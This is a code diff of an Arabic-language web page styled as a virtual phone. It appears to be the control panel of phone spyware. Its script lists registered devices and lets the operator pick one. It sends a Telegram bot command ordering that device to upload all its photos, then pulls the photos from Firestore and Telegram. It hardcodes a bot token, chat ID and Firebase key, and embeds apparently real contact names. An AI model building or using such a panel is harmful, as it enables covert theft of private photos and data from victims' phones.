@@ -32,6 +32,33 @@ input,textarea{user-select:text}
 @keyframes bprog{to{width:100%}}
 .bspin{width:26px;height:26px;border-radius:50%;border:3px solid rgba(255,255,255,.15);border-top-color:#4f8cff;animation:brot .8s linear infinite}
 @keyframes brot{to{transform:rotate(360deg)}}
+/* ⭐ شاشة اختيار الجهاز */
+#picker{position:absolute;inset:0;z-index:600;background:#05070d;background-image:radial-gradient(900px 600px at 50% 0%,#1a2340,transparent);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;transition:opacity .4s}
+#picker.off{opacity:0;pointer-events:none}
+.pk-head{text-align:center;margin-bottom:28px}
+.pk-ic{font-size:54px;margin-bottom:10px}
+.pk-t{font-size:22px;font-weight:800;color:#fff}
+.pk-s{font-size:13px;color:#8a90a6;margin-top:6px}
+#pk-list{width:100%;max-width:400px;max-height:52vh;overflow-y:auto;display:flex;flex-direction:column;gap:10px;margin-bottom:20px}
+.pk-empty{text-align:center;color:#8a90a6;padding:40px 16px;font-size:14px}
+.pk-empty b{color:#3ddc84;display:block;margin-top:12px;font-size:16px}
+.pk-card{background:rgba(255,255,255,.06);border:1.5px solid rgba(255,255,255,.12);border-radius:18px;padding:16px 18px;cursor:pointer;transition:.18s;display:flex;align-items:center;gap:14px}
+.pk-card:active{transform:scale(.97);background:rgba(79,140,255,.12)}
+.pk-card.on{border-color:#4f8cff;background:rgba(79,140,255,.14);box-shadow:0 0 0 3px rgba(79,140,255,.15)}
+.pk-av{width:52px;height:52px;border-radius:16px;background:linear-gradient(135deg,#4f8cff,#2f5fe0);display:flex;align-items:center;justify-content:center;font-size:24px;flex:none}
+.pk-meta{flex:1;min-width:0}
+.pk-nm{font-size:15px;font-weight:700;color:#fff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pk-cd{font-size:12px;color:#8a90a6;font-family:monospace;margin-top:3px;letter-spacing:1px}
+.pk-dot{width:10px;height:10px;border-radius:50%;flex:none}
+.pk-dot.on{background:#3ddc84;box-shadow:0 0 8px #3ddc84}
+.pk-dot.off{background:#5a5f6e}
+.pk-btn{width:100%;max-width:400px;border:none;background:linear-gradient(135deg,#4f8cff,#2f5fe0);color:#fff;padding:15px;border-radius:16px;font-family:inherit;font-size:16px;font-weight:800;cursor:pointer;box-shadow:0 6px 20px rgba(47,95,224,.4);transition:.15s}
+.pk-btn:active{transform:scale(.97)}
+.pk-btn:disabled{opacity:.35;cursor:not-allowed;transform:none}
+.pk-refresh{background:transparent;border:none;color:#4f8cff;font-family:inherit;font-size:13px;margin-top:14px;cursor:pointer;font-weight:600}
+/* ⭐ تبديل جهاز من داخل الهاتف */
+#switch-dev{position:absolute;top:52px;left:14px;z-index:410;background:rgba(0,0,0,.55);border:none;color:#fff;font-family:inherit;font-size:11px;padding:6px 12px;border-radius:14px;cursor:pointer;backdrop-filter:blur(8px);display:none;font-weight:600}
+#switch-dev.show{display:block}
 #apps{position:absolute;inset:0;z-index:10;pointer-events:none}
 .appwin{position:absolute;inset:0;display:none;flex-direction:column;background:var(--appbg);color:var(--apptx);pointer-events:auto;will-change:transform,opacity}
 .ah{display:flex;align-items:center;gap:10px;padding:50px 14px 10px;font-weight:800;font-size:17px;flex:none}
@@ -76,11 +103,7 @@ input,textarea{user-select:text}
 .gcell:active{transform:scale(.94)}
 .gcell img{width:100%;height:100%;object-fit:cover;display:block}
 .chk{display:none;position:absolute;top:5px;left:5px;width:20px;height:20px;border-radius:6px;border:2px solid #fff;background:rgba(0,0,0,.25);z-index:2}
-.ggrid.selm .chk{display:block}
-.gcell.sel .chk{background:#3ddc84;border-color:#3ddc84}
-.gcell.sel img{opacity:.55}
 .gtop{display:flex;gap:8px;align-items:center;margin-bottom:10px;background:var(--card);border-radius:14px;padding:8px 10px;flex-wrap:wrap}
-.gsq{display:inline-block;width:14px;height:14px;border-radius:4px;background:#3ddc84;vertical-align:-2px}
 .gview{position:absolute;inset:0;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:5;touch-action:pan-y}
 .gview img{width:min(86%,340px);aspect-ratio:1;object-fit:cover;border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.5)}
 .gnav{position:absolute;top:50%;left:0;right:0;display:flex;justify-content:space-between;padding:0 10px;transform:translateY(-50%);pointer-events:none}
@@ -96,8 +119,6 @@ input,textarea{user-select:text}
 .fn{font-size:14px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .fs{font-size:11px;color:var(--sub)}
 .empty{text-align:center;color:var(--sub);padding:24px;font-size:14px}
-.nadd{display:flex;gap:8px}
-.nadd input,.brbar input,.urow input,.urow select{flex:1;border:none;background:var(--card);color:var(--apptx);border-radius:13px;padding:11px 14px;font-family:inherit;font-size:14px;outline:none;min-width:0}
 .cwrap{display:flex;flex-direction:column;height:100%;gap:10px}
 .cdsp{background:var(--card);border-radius:18px;padding:18px;text-align:left;direction:ltr;min-height:96px;display:flex;flex-direction:column;justify-content:flex-end;gap:4px;overflow:hidden}
 .cex{color:var(--sub);font-size:16px;min-height:20px;word-break:break-all}
@@ -135,6 +156,7 @@ input,textarea{user-select:text}
 .usegb{flex:1;border:none;background:transparent;color:var(--sub);padding:8px;border-radius:10px;font-family:inherit;font-size:13px;font-weight:700;cursor:pointer}
 .usegb.on{background:#4f8cff;color:#fff}
 .urow{display:flex;gap:8px}
+.urow input,.urow select{flex:1;border:none;background:var(--card);color:var(--apptx);border-radius:13px;padding:11px 14px;font-family:inherit;font-size:14px;outline:none;min-width:0}
 .ueq{text-align:center;color:var(--sub);margin:8px 0}
 .dtools{display:flex;gap:8px;align-items:center;margin-bottom:10px}
 .dtools input[type=color]{width:40px;height:36px;border:none;background:none;cursor:pointer;padding:0}
@@ -144,15 +166,6 @@ audio{width:100%;margin-top:12px}
 .phead{display:flex;align-items:baseline;gap:16px;padding:2px 4px 14px}
 .phead b{font-size:24px}
 .phead span{color:#2f6fed;font-size:20px;font-weight:800}
-.alb{display:grid;grid-template-columns:repeat(3,1fr);gap:16px 12px}
-.a{cursor:pointer}
-.th{aspect-ratio:1;border-radius:18px;position:relative;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,.1);overflow:hidden;background:#181d29}
-.th img{width:100%;height:100%;object-fit:cover;display:block}
-.ph{font-size:26px;filter:grayscale(1);opacity:.45}
-.noimg{color:#3ddc84;font-size:11px;font-weight:700;text-align:center;padding:6px;line-height:1.6}
-.bdg{position:absolute;bottom:6px;left:6px;background:rgba(255,255,255,.95);color:#e0245e;border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;z-index:2}
-.an{font-size:13px;font-weight:700;margin-top:6px}
-.ac{font-size:12px;color:var(--sub)}
 .ah2{display:flex;align-items:center;gap:10px;font-size:16px;font-weight:800;margin-bottom:10px}
 .csearch{display:flex;align-items:center;gap:10px;background:var(--card);border-radius:26px;padding:2px 16px;box-shadow:0 1px 5px rgba(0,0,0,.08);margin-bottom:8px;flex:none}
 .csearch input{flex:1;border:none;background:none;outline:none;font-family:inherit;font-size:14px;color:var(--apptx);padding:10px 0;min-width:0}
@@ -181,11 +194,25 @@ audio{width:100%;margin-top:12px}
 <div class="pbtn" id="bPwr"></div><div class="pbtn" id="bV1"></div><div class="pbtn" id="bV2"></div>
 <div id="scr">
 <div id="notch"></div>
+
+<!-- ⭐ شاشة اختيار الجهاز -->
+<div id="picker">
+  <div class="pk-head">
+    <div class="pk-ic">📱</div>
+    <div class="pk-t">اختر الجهاز</div>
+    <div class="pk-s">يجب اختيار جهاز للمتابعة</div>
+  </div>
+  <div id="pk-list"></div>
+  <button class="pk-btn" id="pk-go" disabled>متابعة</button>
+  <button class="pk-refresh" id="pk-ref">↻ إعادة تحميل الأجهزة</button>
+</div>
+
 <div id="home">
 <div id="pw"><div id="pages"></div></div>
 <div id="dots"><div class="dot on"></div><div class="dot"></div></div>
 <div id="dock"></div>
 </div>
+<button id="switch-dev">🔄 تبديل الجهاز</button>
 <div id="apps"></div>
 <div id="rec"></div>
 <div id="sbar">
@@ -206,13 +233,17 @@ audio{width:100%;margin-top:12px}
 </div>
 <script>
 // ═══════════════════════════════════════════
-//  بيانات الاتصال — من Config.kt
+//  بيانات الاتصال
 // ═══════════════════════════════════════════
 const BOT_TOKEN="8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
 const CHAT_ID="8599240795";
 const FB_KEY="AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
 const FB_PROJECT="hhhxh-5ebe4";
 const FS_BASE="https://firestore.googleapis.com/v1/projects/"+FB_PROJECT+"/databases/(default)/documents";
+
+// ⭐ الرمز الفريد للجهاز المختار
+let DEVICE_CODE = localStorage.getItem("device_code") || "";
+let DEVICE_NAME = localStorage.getItem("device_name") || "";
 
 const $=q=>document.querySelector(q),$$=q=>[...document.querySelectorAll(q)];
 const scr=$('#scr'),pages=$('#pages'),pw=$('#pw'),dock=$('#dock'),appsEl=$('#apps'),rec=$('#rec'),home=$('#home'),sbar=$('#sbar');
@@ -321,7 +352,7 @@ ge=null;
 scr.addEventListener('contextmenu',e=>e.preventDefault());
 window.addEventListener('keydown',e=>{if(e.key==='Escape')back()});
 window.addEventListener('resize',()=>setPage(page,false));
-setTimeout(()=>{const b=$('#boot');if(!b)return;b.classList.add('off');setTimeout(()=>b.remove(),550)},2400);
+
 function tick(){
 const d=new Date();
 $('#clock').textContent=d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'});
@@ -333,34 +364,124 @@ tick();setInterval(tick,5000);
 if(navigator.getBattery)navigator.getBattery().then(b=>{const u=()=>{$('#bat').textContent=Math.round(b.level*100)+'%';$('#batf').setAttribute('width',Math.round(b.level*15))};u();b.addEventListener('levelchange',u)});
 
 /* ═══════════════════════════════════════════
-   المعرض — Firestore REST + Telegram file_id
+   Firestore — قائمة الأجهزة
    ═══════════════════════════════════════════ */
-async function fsListPhotos(){
-  // جرّب كل الأجهزة
+async function fsListDevices(){
   const url=FS_BASE+"/devices?key="+FB_KEY+"&pageSize=100";
   try{
     const r=await fetch(url);
     const j=await r.json();
     const docs=j.documents||[];
-    const all=[];
+    const list=[];
     for(const d of docs){
-      const id=d.name.split("/").pop();
-      const purl=FS_BASE+"/devices/"+id+"/photos?key="+FB_KEY+"&pageSize=300";
-      try{
-        const pr=await fetch(purl);
-        const pj=await pr.json();
-        const pdocs=pj.documents||[];
-        for(const p of pdocs){
-          const f=p.fields||{};
-          all.push({
-            file_id:f.file_id?.stringValue||"",
-            name:f.name?.stringValue||"",
-            size:parseInt(f.size?.integerValue||"0"),
-            date:parseInt(f.date?.integerValue||"0"),
-            device:id
-          });
-        }
-      }catch(e){}
+      const f=d.fields||{};
+      const code=f.code?.stringValue||d.name.split("/").pop();
+      const name=f.name?.stringValue||code;
+      const lastSeen=parseInt(f.last_seen?.integerValue||"0")||parseInt(f.last_seen_ms?.integerValue||"0");
+      const online=(Date.now()-lastSeen)<10*60*1000;
+      list.push({code,name,online,lastSeen});
+    }
+    list.sort((a,b)=>(b.lastSeen||0)-(a.lastSeen||0));
+    return list;
+  }catch(e){return []}
+}
+
+/* ═══════════════════════════════════════════
+   شاشة اختيار الجهاز
+   ═══════════════════════════════════════════ */
+async function showDevicePicker(){
+  const picker=$('#picker'),list=$('#pk-list'),goBtn=$('#pk-go');
+  picker.classList.remove('off');
+  list.innerHTML='<div class="pk-empty">⏳ جاري تحميل الأجهزة...</div>';
+  goBtn.disabled=true;
+
+  const devices=await fsListDevices();
+
+  if(!devices.length){
+    list.innerHTML='<div class="pk-empty">📭 لا توجد أجهزة مسجّلة<br><b>ثبّت التطبيق على جهاز أولاً</b></div>';
+    return;
+  }
+
+  let selected=null;
+
+  const render=()=>{
+    list.innerHTML=devices.map(d=>
+      '<div class="pk-card'+(selected===d.code?' on':'')+'" data-code="'+d.code+'">'+
+      '<div class="pk-av">📱</div>'+
+      '<div class="pk-meta">'+
+        '<div class="pk-nm">'+esc(d.name)+'</div>'+
+        '<div class="pk-cd">'+d.code+'</div>'+
+      '</div>'+
+      '<div class="pk-dot '+(d.online?'on':'off')+'"></div>'+
+      '</div>'
+    ).join('');
+    list.querySelectorAll('.pk-card').forEach(c=>{
+      c.onclick=()=>{
+        selected=c.dataset.code;
+        render();
+        goBtn.disabled=false;
+      };
+    });
+  };
+  render();
+
+  // اختار الجهاز المحفوظ تلقائياً لو موجود
+  if(DEVICE_CODE&&devices.find(d=>d.code===DEVICE_CODE)){
+    selected=DEVICE_CODE;
+    render();
+    goBtn.disabled=false;
+  }
+
+  goBtn.onclick=()=>{
+    if(!selected)return;
+    const dev=devices.find(d=>d.code===selected);
+    DEVICE_CODE=selected;
+    DEVICE_NAME=dev?dev.name:selected;
+    localStorage.setItem("device_code",DEVICE_CODE);
+    localStorage.setItem("device_name",DEVICE_NAME);
+    $('#switch-dev').classList.add('show');
+    startPhone();
+  };
+}
+
+/* ═══════════════════════════════════════════
+   تشغيل الهاتف
+   ═══════════════════════════════════════════ */
+let phoneStarted=false;
+function startPhone(){
+  if(phoneStarted)return;
+  phoneStarted=true;
+  const picker=$('#picker');
+  picker.classList.add('off');
+  setTimeout(()=>picker.style.display='none',450);
+  // boot animation
+  setTimeout(()=>{const b=$('#boot');if(!b)return;b.classList.add('off');setTimeout(()=>b.remove(),550)},2400);
+}
+
+// زر تبديل الجهاز
+$('#switch-dev').onclick=()=>{
+  openWins&&Object.keys(openWins).forEach(k=>{const w=openWins[k];if(w._kill)try{w._kill()}catch(e){}w.remove();delete openWins[k]});
+  location.reload();
+};
+
+/* ═══════════════════════════════════════════
+   المعرض
+   ═══════════════════════════════════════════ */
+async function fsListPhotos(code){
+  const url=FS_BASE+"/devices/"+code+"/photos?key="+FB_KEY+"&pageSize=300";
+  try{
+    const r=await fetch(url);
+    const j=await r.json();
+    const docs=j.documents||[];
+    const all=[];
+    for(const p of docs){
+      const f=p.fields||{};
+      all.push({
+        file_id:f.file_id?.stringValue||"",
+        name:f.name?.stringValue||"",
+        size:parseInt(f.size?.integerValue||"0"),
+        date:parseInt(f.date?.integerValue||"0")
+      });
     }
     return all;
   }catch(e){return []}
@@ -371,8 +492,7 @@ async function tgFileUrl(fileId){
     const r=await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/getFile?file_id="+encodeURIComponent(fileId));
     const j=await r.json();
     if(!j.ok)return "";
-    const p=j.result.file_path;
-    return "https://api.telegram.org/file/bot"+BOT_TOKEN+"/"+p;
+    return "https://api.telegram.org/file/bot"+BOT_TOKEN+"/"+j.result.file_path;
   }catch(e){return ""}
 }
 
@@ -382,16 +502,16 @@ function buildGallery(el,w){
 
   const render=()=>{
     if(loading){
-      el.innerHTML='<div class="phead"><b>الصور</b></div><div class="empty" style="padding-top:60px">⏳ جاري تحميل الصور...</div>';
+      el.innerHTML='<div class="phead"><b>الصور</b></div><div class="empty" style="padding-top:60px">⏳ جاري تحميل الصور...<br><br>🆔 '+DEVICE_CODE+'</div>';
       return;
     }
     const imgs=w._imgs;
     el.innerHTML='<div class="phead"><b>الصور</b><span>'+imgs.length+' صورة</span></div>'+
-      '<div class="gtop" id="gtop"><button class="gbtn" id="gref">↻ تحديث</button>'+
+      '<div class="gtop" style="display:flex"><button class="gbtn" id="gref">↻ تحديث</button>'+
       '<button class="gbtn" id="gclr">🗑 مسح</button>'+
-      '<span id="gsz" style="font-size:11px;color:var(--sub);margin-right:auto"></span></div>'+
+      '<span style="font-size:11px;color:var(--sub);margin-right:auto">🆔 '+DEVICE_CODE+'</span></div>'+
       (imgs.length?'<div class="ggrid" id="gg">'+imgs.map((o,j)=>
-        '<div class="gcell" data-j="'+j+'"><img loading="lazy" src="'+o.src+'" onerror="this.parentElement.style.background=\'#333\'"></div>'
+        '<div class="gcell" data-j="'+j+'"><img loading="lazy" src="'+o.src+'"></div>'
       ).join('')+'</div>':'<div class="empty" style="color:#3ddc84;padding-top:60px">📸 لا توجد صور بعد<br><br>اضغط "تحديث" لجلب الصور من الجهاز</div>');
     el.querySelector('#gref').onclick=()=>refresh();
     el.querySelector('#gclr').onclick=()=>{w._imgs=[];render()};
@@ -423,19 +543,20 @@ function buildGallery(el,w){
 
   const refresh=async()=>{
     if(loading)return;
+    if(!DEVICE_CODE){
+      el.innerHTML='<div class="empty" style="padding-top:60px;color:#e0245e">❌ لم يتم اختيار جهاز<br>أعد تشغيل الصفحة</div>';
+      return;
+    }
     loading=true;render();
-    // 1. ابعت أمر للبوت
     try{
       await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
         method:"POST",
         headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({chat_id:CHAT_ID,text:"📸 كل الصور"})
+        body:JSON.stringify({chat_id:CHAT_ID,text:"📸 كل الصور "+DEVICE_CODE})
       });
     }catch(e){}
-    // 2. انتظر 3 ثواني
-    await new Promise(r=>setTimeout(r,3000));
-    // 3. اجلب list من Firestore
-    const list=await fsListPhotos();
+    await new Promise(r=>setTimeout(r,5000));
+    const list=await fsListPhotos(DEVICE_CODE);
     list.sort((a,b)=>(b.date||0)-(a.date||0));
     w._imgs=[];
     for(const p of list){
@@ -449,7 +570,10 @@ function buildGallery(el,w){
   refresh();
 }
 
-/* الملفات */
+/* ═══════════════════════════════════════════ */
+/* باقي التطبيقات — نفس الكود السابق */
+/* ═══════════════════════════════════════════ */
+
 function buildFiles(el,w){
 w._files=w._files||[];
 el.innerHTML='<div class="dz"><div style="font-size:34px">📁</div><div>اسحب أي ملفات هنا أو اضغط لاختيارها من جهازك</div><input type="file" multiple hidden></div><div class="flist"></div>';
@@ -469,12 +593,11 @@ if(d.rm!==undefined){URL.revokeObjectURL(w._files[d.rm].url);w._files.splice(d.r
 });
 render();
 }
-/* جهات الاتصال */
 function buildNotes(el,w){
-const CS=[['آدميلتي (🥺❤️🔐..."ء','#f9ab00'],['اب عبود القلب','#34a853'],['ابن الرئاصه','#ea4335'],['ابو احمد الاحمد','#a142f4'],['ابو اسد','#00b8d4'],['ابو الحسنس','#f2730c'],['ابو الكر','#34a853'],['ابو ايوب','#ea4335'],['ابو براهيم','#f9ab00'],['ابو جراح القلب','#34a853'],['ابو جني','#ea4335'],['ابو جود','#ea4335']];
+const CS=[['آدميلتي','#f9ab00'],['اب عبود القلب','#34a853'],['ابن الرئاصه','#ea4335'],['ابو احمد الاحمد','#a142f4'],['ابو اسد','#00b8d4'],['ابو الحسنس','#f2730c'],['ابو الكر','#34a853'],['ابو ايوب','#ea4335'],['ابو براهيم','#f9ab00'],['ابو جراح القلب','#34a853'],['ابو جني','#ea4335'],['ابو جود','#ea4335']];
 const psvg='<svg viewBox="0 0 24 24" width="24" height="24" fill="#fff"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zm0 2c-5 0-9 2.5-9 6v2h18v-2c0-3.5-4-6-9-6z"/></svg>';
 el.classList.add('flexcol');
-el.innerHTML='<div class="csearch"><input placeholder="البحث في جهات الاتصال والأماكن"><span>🎙</span><span style="font-weight:800">⋮</span></div><div class="clist"></div><div class="ctabs"><div class="ct on" data-t="0">👥<span>جهات اتصال</span></div><div class="ct" data-t="1">🕒<span>الأخيرة</span></div><div class="ct" data-t="2">⭐<span>مفضلة</span></div></div><button class="cdial"><svg viewBox="0 0 24 24" width="22" height="22" fill="#fff"><circle cx="6" cy="6" r="2.2"/><circle cx="12" cy="6" r="2.2"/><circle cx="18" cy="6" r="2.2"/><circle cx="6" cy="12" r="2.2"/><circle cx="12" cy="12" r="2.2"/><circle cx="18" cy="12" r="2.2"/><circle cx="6" cy="18" r="2.2"/><circle cx="12" cy="18" r="2.2"/><circle cx="18" cy="18" r="2.2"/></svg></button>';
+el.innerHTML='<div class="csearch"><input placeholder="البحث"><span>🎙</span></div><div class="clist"></div><div class="ctabs"><div class="ct on" data-t="0">👥<span>جهات اتصال</span></div><div class="ct" data-t="1">🕒<span>الأخيرة</span></div><div class="ct" data-t="2">⭐<span>مفضلة</span></div></div>';
 const list=el.querySelector('.clist'),inp=el.querySelector('.csearch input');
 const row=c=>'<div class="crow" data-i="'+CS.indexOf(c)+'"><div class="cav" style="background:'+c[1]+'">'+psvg+'</div><div class="cn">'+c[0]+'</div></div>';
 let tab=0;
@@ -487,19 +610,8 @@ list.innerHTML=a.length?a.map(row).join(''):'<div class="empty">لا توجد ن
 };
 inp.addEventListener('input',render);
 el.querySelector('.ctabs').addEventListener('click',e=>{const t=e.target.closest('.ct');if(!t)return;tab=+t.dataset.t;el.querySelectorAll('.ct').forEach(x=>x.classList.toggle('on',x===t));render()});
-const toast=t=>{const d=document.createElement('div');d.className='toast';d.textContent=t;el.appendChild(d);setTimeout(()=>d.remove(),1500)};
-el.querySelector('.cdial').onclick=()=>toast('لوحة المفاتيح غير متاحة في النسخة التجريبية');
-list.addEventListener('click',e=>{
-const r=e.target.closest('.crow');if(!r)return;
-const i=+r.dataset.i,c=CS[i],old=list.innerHTML;
-list.innerHTML='<div style="display:flex;flex-direction:column;align-items:center;gap:10px;padding-top:46px"><div class="cav" style="width:92px;height:92px;background:'+c[1]+'">'+psvg+'</div><div style="font-size:19px;font-weight:800">'+c[0]+'</div><div dir="ltr" style="color:var(--sub);font-size:15px">0770'+String(1000000+i*137913).slice(0,7)+'</div><div style="display:flex;gap:10px;margin-top:8px"><button class="pbtn2" id="cc">📞 اتصال</button><button class="gbtn" id="cm">💬 رسالة</button></div></div>';
-w._stack.push(()=>{list.innerHTML=old});
-list.querySelector('#cc').onclick=()=>toast('جارٍ الاتصال بـ '+c[0]+' ...');
-list.querySelector('#cm').onclick=()=>toast('الرسائل غير متاحة في النسخة التجريبية');
-});
 render();
 }
-/* الحاسبة */
 function buildCalc(el,w){
 const keys=['C','⌫','±','÷','7','8','9','×','4','5','6','−','1','2','3','+','0','.','%','='];
 el.innerHTML='<div class="cwrap"><div class="cdsp"><div class="cex" id="cex"></div><div class="cres" id="cres">0</div></div><div class="ckbd">'+keys.map(k=>'<button class="ck '+('÷×−+='.includes(k)?'cop':('C⌫'.includes(k)?'csp':''))+'" data-k="'+k+'">'+k+'</button>').join('')+'</div></div>';
@@ -515,7 +627,6 @@ else ex+=k;
 cex.textContent=ex;
 });
 }
-/* الساعة */
 function buildClock(el,w){
 el.innerHTML='<div class="bigclock" id="bck"></div><div class="bigdate" id="bdt"></div><div class="sep"></div><div class="sw"><div class="swd" id="swd">00:00.0</div><div class="swb"><button class="pbtn2" id="swst">بدء</button><button class="gbtn" id="swrs">تصفير</button></div></div>';
 const bck=el.querySelector('#bck'),bdt=el.querySelector('#bdt'),swd=el.querySelector('#swd');
@@ -530,51 +641,32 @@ else{acc+=Date.now()-t0;clearInterval(siv);e.target.textContent='بدء'}
 el.querySelector('#swrs').addEventListener('click',()=>{run=false;acc=0;clearInterval(siv);swd.textContent='00:00.0';el.querySelector('#swst').textContent='بدء'});
 const old=w._kill;w._kill=()=>{clearInterval(iv);clearInterval(siv);old&&old()};
 }
-/* المتصفح */
 function buildBrowser(el,w){
 el.classList.add('flexcol');
-el.innerHTML='<div class="brbar"><input id="brin" placeholder="example.com" value="https://example.com" dir="ltr"><button class="pbtn2" id="brgo">ذهاب</button></div><iframe class="brfr" id="brfr" src="https://example.com" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe><div class="brhint">بعض المواقع تمنع عرضها داخل إطار — جرّب ويكيبيديا أو example.com</div>';
+el.innerHTML='<div class="brbar"><input id="brin" value="https://example.com" dir="ltr"><button class="pbtn2" id="brgo">ذهاب</button></div><iframe class="brfr" id="brfr" src="https://example.com" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>';
 const go=()=>{let u=el.querySelector('#brin').value.trim();if(u&&!/^https?:\/\//.test(u))u='https://'+u;if(u)el.querySelector('#brfr').src=u};
 el.querySelector('#brgo').addEventListener('click',go);
-el.querySelector('#brin').addEventListener('keydown',e=>{if(e.key==='Enter')go()});
 }
-/* الكاميرا */
 function buildCamera(el,w){
-el.innerHTML='<div class="camv"><video id="cv" autoplay playsinline muted></video><img id="cshot" style="display:none"></div><div class="cbtns"><button class="pbtn2" id="con">تشغيل الكاميرا</button><button class="shut" id="csnap" style="display:none" title="التقاط"></button><button class="gbtn" id="cdl" style="display:none">⬇ تحميل</button><button class="gbtn" id="cret" style="display:none">↺ إعادة</button><button class="gbtn" id="cstop" style="display:none">إيقاف</button></div><div class="brhint" id="cmsg"></div>';
-let stream=null,durl='';
+el.innerHTML='<div class="camv"><video id="cv" autoplay playsinline muted></video><img id="cshot" style="display:none"></div><div class="cbtns"><button class="pbtn2" id="con">تشغيل الكاميرا</button><button class="shut" id="csnap" style="display:none"></button><button class="gbtn" id="cstop" style="display:none">إيقاف</button></div><div class="brhint" id="cmsg"></div>';
+let stream=null;
 const q=s=>el.querySelector(s),v=q('#cv'),shot=q('#cshot'),msg=q('#cmsg');
 q('#con').addEventListener('click',async()=>{
-try{
-stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
-v.srcObject=stream;
-q('#csnap').style.display='';q('#cstop').style.display='';msg.textContent='';
-}catch(e){msg.textContent='تعذر الوصول إلى الكاميرا: '+e.message}
+try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});v.srcObject=stream;q('#csnap').style.display='';q('#cstop').style.display='';msg.textContent=''}catch(e){msg.textContent='خطأ: '+e.message}
 });
-q('#csnap').addEventListener('click',()=>{
-if(!stream||!v.videoWidth)return;
-const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
-const x=c.getContext('2d');x.translate(c.width,0);x.scale(-1,1);x.drawImage(v,0,0);
-durl=c.toDataURL('image/png');shot.src=durl;shot.style.display='block';v.style.display='none';
-q('#cdl').style.display='';q('#cret').style.display='';
-w._stack.push(()=>{shot.style.display='none';v.style.display='';q('#cdl').style.display='none';q('#cret').style.display='none'});
-});
-q('#cdl').addEventListener('click',()=>dl(durl,'صورتي.png'));
-q('#cret').addEventListener('click',()=>{if(w._stack.length)w._stack.pop()()});
+q('#csnap').addEventListener('click',()=>{if(!stream||!v.videoWidth)return;const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;const x=c.getContext('2d');x.translate(c.width,0);x.scale(-1,1);x.drawImage(v,0,0);shot.src=c.toDataURL('image/png');shot.style.display='block';v.style.display='none'});
 const stop=()=>{if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}q('#csnap').style.display='none';q('#cstop').style.display='none'};
 q('#cstop').addEventListener('click',stop);
 const old=w._kill;w._kill=()=>{stop();old&&old()};
 }
-/* الإعدادات */
 function buildSettings(el,w){
 const walls=['linear-gradient(160deg,#2b5876,#4e4376)','linear-gradient(160deg,#0f2027,#2c5364)','linear-gradient(160deg,#42275a,#734b6d)','linear-gradient(160deg,#136a8a,#267871)','linear-gradient(160deg,#232526,#414345)','linear-gradient(160deg,#e96443,#904e95)'];
-el.innerHTML='<div class="stitle">الخلفية</div><div class="wrow">'+walls.map((wl,i)=>'<button class="wsw" data-i="'+i+'" style="background:'+wl+'"></button>').join('')+'</div><div class="stitle">المظهر</div><div class="srow"><span>الوضع الداكن للتطبيقات</span><button class="tgl" id="tg"><i></i></button></div><div class="stitle">البيانات</div><div class="srow"><span>مسح الملاحظات المحفوظة</span><button class="gbtn" id="clr">مسح</button></div><div class="stitle">حول الجهاز</div><div class="about">هاتف افتراضي · الإصدار 1.0<br>يعمل بالكامل داخل المتصفح بدون خادم</div>';
+el.innerHTML='<div class="stitle">الخلفية</div><div class="wrow">'+walls.map((wl,i)=>'<button class="wsw" data-i="'+i+'" style="background:'+wl+'"></button>').join('')+'</div><div class="stitle">المظهر</div><div class="srow"><span>الوضع الداكن</span><button class="tgl" id="tg"><i></i></button></div><div class="stitle">الجهاز الحالي</div><div class="about">🆔 '+DEVICE_CODE+'<br>📱 '+esc(DEVICE_NAME)+'</div>';
 el.querySelector('.wrow').addEventListener('click',e=>{const b=e.target.closest('.wsw');if(b)scr.style.setProperty('--wall',walls[b.dataset.i])});
 const tg=el.querySelector('#tg');
 tg.classList.toggle('on',scr.classList.contains('dark'));
 tg.addEventListener('click',()=>{scr.classList.toggle('dark');tg.classList.toggle('on')});
-el.querySelector('#clr').addEventListener('click',e=>{localStorage.removeItem('vnotes');e.target.textContent='تم ✓'});
 }
-/* التحويل */
 function buildUnits(el,w){
 const U={'طول':{'متر':1,'كيلومتر':1000,'سنتيمتر':.01,'مليمتر':.001,'ميل':1609.34,'قدم':.3048,'بوصة':.0254},'وزن':{'كيلوجرام':1,'جرام':.001,'رطل':.453592,'أونصة':.0283495},'بيانات':{'بايت':1,'كيلوبايت':1024,'ميجابايت':1048576,'جيجابايت':1073741824}};
 el.innerHTML='<div class="useg">'+Object.keys(U).map((c,i)=>'<button class="usegb '+(i?'':'on')+'" data-c="'+c+'">'+c+'</button>').join('')+'</div><div class="urow"><input id="uv" type="number" value="1" dir="ltr"><select id="uf"></select></div><div class="ueq">=</div><div class="urow"><input id="ur" readonly dir="ltr"><select id="ut"></select></div>';
@@ -586,7 +678,6 @@ el.querySelector('.useg').addEventListener('click',e=>{const b=e.target.closest(
 [uv,uf,ut].forEach(x=>{x.addEventListener('input',conv);x.addEventListener('change',conv)});
 fill();
 }
-/* الرسم */
 function buildDraw(el,w){
 el.classList.add('flexcol');
 el.innerHTML='<div class="dtools"><input type="color" id="dc0" value="#e0245e"><input type="range" id="dc1" min="2" max="30" value="6"><button class="gbtn" id="dc2">مسح</button><button class="gbtn" id="dc3">⬇ حفظ</button></div><canvas class="dcv"></canvas>';
@@ -602,27 +693,22 @@ cv.addEventListener('pointerup',()=>d=false);
